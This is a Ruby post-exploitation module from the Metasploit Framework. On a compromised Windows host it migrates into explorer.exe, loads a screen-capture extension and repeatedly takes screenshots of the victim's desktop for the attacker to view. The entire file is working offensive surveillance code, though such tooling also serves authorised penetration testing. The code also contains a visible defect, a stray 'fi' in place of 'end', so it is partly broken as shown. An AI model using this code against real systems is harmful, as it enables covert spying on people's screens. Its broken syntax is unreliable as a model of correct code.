##
# $Id: screen_spy.rb 12455 2011-04-27 16:25:15Z bannedit $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rbconfig'

class Metasploit3 < Msf::Post
	def initialize(info={})
		super( update_info(info,
			'Name'           => 'Windows Gather Screen Spy',
			'Description'    => %q{ 
					This module will incrementally take screenshots of the meterpreter host. This
				allows for screen spying which can be useful to determine if there is an active
				user on a machine.
				},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Roni Bachar <roni.bachar.blog[at]gmail.com>', # original meterpreter script
					'bannedit' # post module
				],
			'Version'        => '$Revision: 12455 $',
			'Platform'       => ['windows'],
			'SessionTypes'   => ['meterpreter']
		))

		register_options(
			[
				OptInt.new('DELAY', [false, 'Interval between screenshots in seconds', 5]),
				OptInt.new('COUNT', [false, 'Number of screenshots to collect', 60]),
				OptString.new('BROWSER', [false, 'Browser to use for viewing screenshots', 'firefox']),
				OptBool.new('RECORD', [false, 'Record all screenshots to disk',false])
			], self.class)
	end

	def run
		host = session.tunnel_peer.split(':')[0]
		screenshot = Msf::Config.install_root + "/data/" + host + ".jpg"

		migrate_explorer
		if session.platform !~ /win32|win64/i
			print_error("Unsupported Platform")
			return
		end

		begin
			session.core.load("espia")
		rescue ::Exception => e
			print_error("Failed to load espia extension")
			return
		end

		# here we check for the local platform and use default browsers
		# linux is the one question mark firefox is not necessarily a 
		case ::Config::CONFIG['host'] # neat trick to get the local system platform
		when /ming/
			cmd = "start #{datastore['BROWSER']} \"file://#{screenshot}\""
		when /linux/
			cmd = "#{datastore['BROWSER']} file://#{screenshot}"
		when /apple/
			cmd = "open file://#{screenshot}" # this will use preview
		end

		begin
			count = datastore['COUNT']
			print_status "Capturing %u screenshots with a delay of %u seconds" % [count, datastore['DELAY']]
			count.times do |num|
				select(nil, nil, nil, datastore['DELAY'])
				data = session.espia.espia_image_get_dev_screen
				if data
					if datastore['RECORD']
						shot = "#{screenshot}.#{num}"
						ss = ::File.new(shot, 'wb')
						ss.write(data)
						ss.close						
					fi
					
					fd = ::File.new(screenshot, 'wb')
					fd.write(data)
					fd.close
				end
				system(cmd)
			end
		rescue ::Exception => e
			print_error("Error taking screenshot: #{e.class} #{e} #{e.backtrace}")
			return
		end
		print_status("Screen Spying Complete")
		::File.delete(screenshot)
	end

	def migrate_explorer
		pid = session.sys.process.getpid
		session.sys.process.get_processes.each do |p|
			if p['name'] == 'explorer.exe' and p['pid'] != pid
				print_status("Migrating to explorer.exe pid: #{p['pid']}")
				begin
					session.core.migrate(p['pid'].to_i)
					print_status("Migration successful")
				rescue
					print_status("Migration failed.")
					return
				end
			end
		end
	end
end